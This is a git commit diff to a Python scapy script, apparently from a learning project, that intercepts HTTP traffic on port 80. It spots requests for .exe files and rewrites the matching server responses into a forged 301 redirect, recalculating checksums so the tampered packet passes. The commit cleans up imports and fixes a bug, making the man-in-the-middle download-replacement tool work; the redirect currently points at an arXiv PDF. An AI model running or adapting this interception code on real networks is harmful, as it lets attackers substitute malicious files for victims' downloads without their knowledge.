58ab139b45ba8d1c60d3f6a38e8057a7e09121b5
ariyonaty <ari.h.yonaty@gmail.com>
2021-06-01 22:50:48 +0000

    Cleaned up file mod

--- File_Interceptor/replace_downloads.py
+++ File_Interceptor/replace_downloads.py
@@ -8,31 +8,31 @@ ack_list = []
 
 def set_load(packet, load):
     print(packet.show())
-    packet[scapy.all.Raw].load = load
+    packet[Raw].load = load
 
-    del packet[scapy.all.IP].len
-    del packet[scapy.all.IP].chksum
-    del packet[scapy.all.TCP].chksum
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[TCP].chksum
 
     return packet
 
 def process_packet(packet):
     
     scapy_packet = IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.all.Raw) and scapy_packet.haslayer(TCP):
+    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
         if scapy_packet[TCP].dport == 80:
             # print("HTTP Request")
-            if ".exe".encode() in scapy_packet[scapy.all.Raw].load:
+            if ".exe".encode() in scapy_packet[Raw].load:
                 print("[+] exe request detected.") 
-                ack_list.append(scapy_packet[scapy.all.TCP].ack)
+                ack_list.append(scapy_packet[TCP].ack)
                 print(scapy_packet.show())
         elif scapy_packet[TCP].sport == 80:
             # print("HTTP Response")
             if scapy_packet[TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.all.TCP].seq)
+                ack_list.remove(scapy_packet[TCP].seq)
                 print("[+] Modifying download file")
                 print(scapy_packet.show())
-                mod_packet = set_load(scapy, b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n")
+                mod_packet = set_load(scapy_packet, b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n")
 
                 packet.set_payload(bytes(mod_packet))
 
